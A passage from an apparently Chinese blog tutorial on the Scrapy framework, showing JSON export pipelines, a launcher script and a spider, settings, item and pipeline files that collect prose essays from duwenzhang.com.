https://doc.scrapy.org/en/latest/topics/item-pipeline.html</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># 第一种方法，没进行json优化，但是看起来简单易操作</span></span><br><span class="line"><span class="string">import json</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">class XiushiPipeline(object):</span></span><br><span class="line"><span class="string">    def __init__(self):</span></span><br><span class="line"><span class="string">        self.fp = open(&#x27;duanzi.json&#x27;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    def open_spider(self, spider):</span></span><br><span class="line"><span class="string">        print(&#x27;爬虫开始了...&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    def process_item(self, item, spider):</span></span><br><span class="line"><span class="string">        item_json = json.dumps(dict(item),  ensure_ascii=False)</span></span><br><span class="line"><span class="string">        self.fp.write(item_json+&#x27;\n&#x27;)</span></span><br><span class="line"><span class="string">        return item</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    def close_spider(self, spider):</span></span><br><span class="line"><span class="string">        self.fp.close()</span></span><br><span class="line"><span class="string">        print(&quot;爬虫结束了...&quot;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 方案二，json优化，结果是每个字典存储在列表中</span></span><br><span class="line"><span class="comment">#        好处是满足json规则，坏处是数据量较大时比较耗内存</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27; 自我感觉这种方法不咋地 &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># from scrapy.exporters import JsonItemExporter</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># class XiushiPipeline(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self):</span></span><br><span class="line"><span class="comment">#         # 注意此时以二进制形式写入</span></span><br><span class="line"><span class="comment">#         self.fp = open(&#x27;duanzi.json&#x27;, &#x27;wb&#x27;)</span></span><br><span class="line"><span class="comment">#         self.exporter = JsonItemExporter(self.fp, ensure_ascii=False, encoding=&#x27;utf-8&#x27;)</span></span><br><span class="line"><span class="comment">#         self.exporter.start_exporting()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     def open_spider(self, spider):</span></span><br><span class="line"><span class="comment">#         print(&#x27;爬虫开始了...&#x27;)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     def process_item(self, item, spider):</span></span><br><span class="line"><span class="comment">#         self.exporter.export_item(item)</span></span><br><span class="line"><span class="comment">#         return item</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     def close_spider(self, spider):</span></span><br><span class="line"><span class="comment">#         self.exporter.finish_exporting()</span></span><br><span class="line"><span class="comment">#         self.fp.close()</span></span><br><span class="line"><span class="comment">#         print(&quot;爬虫结束了...&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;方案三&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> scrapy.exporters <span class="keyword">import</span> JsonLinesItemExporter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XiushiPipeline</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 注意此时以二进制形式写入</span></span><br><span class="line">        self.fp = <span class="built_in">open</span>(<span class="string">&#x27;duanzi.json&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">        self.exporter = JsonLinesItemExporter(self.fp, ensure_ascii=<span class="literal">False</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open_spider</span>(<span class="params">self, spider</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;爬虫开始了...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span>(<span class="params">self, item, spider</span>):</span></span><br><span class="line">        self.exporter.export_item(item)</span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close_spider</span>(<span class="params">self, spider</span>):</span></span><br><span class="line">        self.fp.close()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;爬虫结束了...&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>可以在总文件中创建.py文件，代替爬虫开始命令 scrapy crawl xiushiSpider (注意应在爬虫目录下执行该命令)</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scrapy <span class="keyword">import</span> cmdline</span><br><span class="line"></span><br><span class="line">cmdline.execute(<span class="string">&quot;scrapy crawl xiushiSpider&quot;</span>.split())</span><br><span class="line"><span class="comment"># cmdline.execute([&quot;scrapy&quot;, &#x27;crawl&#x27;, &#x27;xiushiSpider&#x27;])</span></span><br></pre></td></tr></table></figure><h1 id="爬虫第六天"><a href="#爬虫第六天" class="headerlink" title="爬虫第六天"></a>爬虫第六天</h1><h3 id="scrapy-框架之spider类（示例二-爬取优美散文）"><a href="#scrapy-框架之spider类（示例二-爬取优美散文）" class="headerlink" title="scrapy 框架之spider类（示例二.爬取优美散文）"></a>scrapy 框架之spider类（示例二.爬取优美散文）</h3><ul><li>item部分</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Define here the models for your scraped items</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># See documentation in:</span></span><br><span class="line"><span class="comment"># https://doc.scrapy.org/en/latest/topics/items.html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProseItem</span>(<span class="params">scrapy.Item</span>):</span></span><br><span class="line">    <span class="comment"># define the fields for your item here like:</span></span><br><span class="line">    <span class="comment"># name = scrapy.Field()</span></span><br><span class="line">    title = scrapy.Field()</span><br><span class="line">    text = scrapy.Field()</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>settings部分</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Scrapy settings for prose project</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># For simplicity, this file contains only settings considered important or</span></span><br><span class="line"><span class="comment"># commonly used. You can find more settings consulting the documentation:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     https://doc.scrapy.org/en/latest/topics/settings.html</span></span><br><span class="line"><span class="comment">#     https://doc.scrapy.org/en/latest/topics/downloader-middleware.html</span></span><br><span class="line"><span class="comment">#     https://doc.scrapy.org/en/latest/topics/spider-middleware.html</span></span><br><span class="line"></span><br><span class="line">BOT_NAME = <span class="string">&#x27;prose&#x27;</span></span><br><span class="line"></span><br><span class="line">SPIDER_MODULES = [<span class="string">&#x27;prose.spiders&#x27;</span>]</span><br><span class="line">NEWSPIDER_MODULE = <span class="string">&#x27;prose.spiders&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Crawl responsibly by identifying yourself (and your website) on the user-agent</span></span><br><span class="line"><span class="comment"># USER_AGENT = &#x27;prose (+http://www.yourdomain.com)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Obey robots.txt rules</span></span><br><span class="line">ROBOTSTXT_OBEY = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure maximum concurrent requests performed by Scrapy (default: 16)</span></span><br><span class="line"><span class="comment"># CONCURRENT_REQUESTS = 32</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure a delay for requests for the same website (default: 0)</span></span><br><span class="line"><span class="comment"># See https://doc.scrapy.org/en/latest/topics/settings.html#download-delay</span></span><br><span class="line"><span class="comment"># See also autothrottle settings and docs</span></span><br><span class="line">DOWNLOAD_DELAY = <span class="number">1</span></span><br><span class="line"><span class="comment"># The download delay setting will honor only one of:</span></span><br><span class="line"><span class="comment"># CONCURRENT_REQUESTS_PER_DOMAIN = 16</span></span><br><span class="line"><span class="comment"># CONCURRENT_REQUESTS_PER_IP = 16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Disable cookies (enabled by default)</span></span><br><span class="line"><span class="comment"># COOKIES_ENABLED = False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Disable Telnet Console (enabled by default)</span></span><br><span class="line"><span class="comment"># TELNETCONSOLE_ENABLED = False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Override the default request headers:</span></span><br><span class="line">DEFAULT_REQUEST_HEADERS = &#123;</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &#x27;</span></span><br><span class="line">                  <span class="string">&#x27;Chrome/80.0.3987.163 Safari/537.36 &#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable or disable spider middlewares</span></span><br><span class="line"><span class="comment"># See https://doc.scrapy.org/en/latest/topics/spider-middleware.html</span></span><br><span class="line"><span class="comment"># SPIDER_MIDDLEWARES = &#123;</span></span><br><span class="line"><span class="comment">#    &#x27;prose.middlewares.ProseSpiderMiddleware&#x27;: 543,</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable or disable downloader middlewares</span></span><br><span class="line"><span class="comment"># See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html</span></span><br><span class="line"><span class="comment"># DOWNLOADER_MIDDLEWARES = &#123;</span></span><br><span class="line"><span class="comment">#    &#x27;prose.middlewares.ProseDownloaderMiddleware&#x27;: 543,</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable or disable extensions</span></span><br><span class="line"><span class="comment"># See https://doc.scrapy.org/en/latest/topics/extensions.html</span></span><br><span class="line"><span class="comment"># EXTENSIONS = &#123;</span></span><br><span class="line"><span class="comment">#    &#x27;scrapy.extensions.telnet.TelnetConsole&#x27;: None,</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure item pipelines</span></span><br><span class="line"><span class="comment"># See https://doc.scrapy.org/en/latest/topics/item-pipeline.html</span></span><br><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line">   <span class="string">&#x27;prose.pipelines.ProsePipeline&#x27;</span>: <span class="number">300</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable and configure the AutoThrottle extension (disabled by default)</span></span><br><span class="line"><span class="comment"># See https://doc.scrapy.org/en/latest/topics/autothrottle.html</span></span><br><span class="line"><span class="comment"># AUTOTHROTTLE_ENABLED = True</span></span><br><span class="line"><span class="comment"># The initial download delay</span></span><br><span class="line"><span class="comment"># AUTOTHROTTLE_START_DELAY = 5</span></span><br><span class="line"><span class="comment"># The maximum download delay to be set in case of high latencies</span></span><br><span class="line"><span class="comment"># AUTOTHROTTLE_MAX_DELAY = 60</span></span><br><span class="line"><span class="comment"># The average number of requests Scrapy should be sending in parallel to</span></span><br><span class="line"><span class="comment"># each remote server</span></span><br><span class="line"><span class="comment"># AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0</span></span><br><span class="line"><span class="comment"># Enable showing throttling stats for every response received:</span></span><br><span class="line"><span class="comment"># AUTOTHROTTLE_DEBUG = False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable and configure HTTP caching (disabled by default)</span></span><br><span class="line"><span class="comment"># See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings</span></span><br><span class="line"><span class="comment"># HTTPCACHE_ENABLED = True</span></span><br><span class="line"><span class="comment"># HTTPCACHE_EXPIRATION_SECS = 0</span></span><br><span class="line"><span class="comment"># HTTPCACHE_DIR = &#x27;httpcache&#x27;</span></span><br><span class="line"><span class="comment"># HTTPCACHE_IGNORE_HTTP_CODES = []</span></span><br><span class="line"><span class="comment"># HTTPCACHE_STORAGE = &#x27;scrapy.extensions.httpcache.FilesystemCacheStorage&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>proseSpider部分</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> prose.items <span class="keyword">import</span> ProseItem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProsespiderSpider</span>(<span class="params">scrapy.Spider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;proseSpider&#x27;</span></span><br><span class="line">    allowed_domains = [<span class="string">&#x27;duwenzhang.com&#x27;</span>]</span><br><span class="line">    start_urls = [<span class="string">&#x27;http://www.duwenzhang.com/wenzhang/shenghuosuibi/&#x27;</span>]</span><br><span class="line">    base_url = <span class="string">&#x27;http://www.duwenzhang.com/wenzhang/shenghuosuibi/&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        <span class="comment"># xpath 选择不含有某一属性的标签</span></span><br><span class="line">        url_list = response.xpath(<span class="string">&#x27;//center//tr[2]//td[(@valign) and not(@height)]/table&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> it <span class="keyword">in</span> url_list:</span><br><span class="line">            title = it.xpath(<span class="string">&#x27;.//tr[2]//td[@height=&quot;26&quot;]/b/a/text()&#x27;</span>).getall()</span><br><span class="line">            text = it.xpath(<span class="string">&#x27;.//tr[4]/td[@style=&quot;padding-left:3px&quot;]/text()&#x27;</span>).getall()</span><br><span class="line">            text = <span class="string">&quot;&quot;</span>.join(text).strip()</span><br><span class="line">            item = ProseItem(title=title, text=text)</span><br><span class="line">            <span class="keyword">yield</span> item</span><br><span class="line">        <span class="comment"># //a[contains(text(), &quot;百度搜索&quot;)]  【可以部分检索】</span></span><br><span class="line">        <span class="comment"># //a[text()=&quot;文字内容&quot;] 【需要填全】 xpath定位指定文本标签</span></span><br><span class="line">        next_url = response.xpath(<span class="string">&#x27;//tr//a[text()=&quot;下一页&quot;]/@href&#x27;</span>).get()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> next_url:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">yield</span> scrapy.Request(self.base_url+next_url, callback=self.parse)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>piplines 部分</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Define your item pipelines here</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Don&#x27;t forget to add your pipeline to the ITEM_PIPELINES setting</span></span><br><span class="line"><span class="comment"># See: https://doc.scrapy.org/en/latest/topics/item-pipeline.html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> scrapy.exporters <span class="keyword">import</span> JsonLinesItemExporter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProsePipeline</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.fp = <span class="built_in">open</span>(<span class="string">&#x27;prose.json&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">        self.exporter = JsonLinesItemExporter(self.fp, ensure_ascii=<span class="literal">False</span>,</span><br><span class="line">                                              encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open_spider</span>(<span class="params">self, spider</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;爬虫开始了...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span>(<span class="params">self, item, spider</span>):</span></span><br><span class="line">        self.exporter.export_item(item)</span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close_spider</span>(<span class="params">self, spider</span>):</span></span><br><span class="line">        self.fp.close()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;爬虫结束了....&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
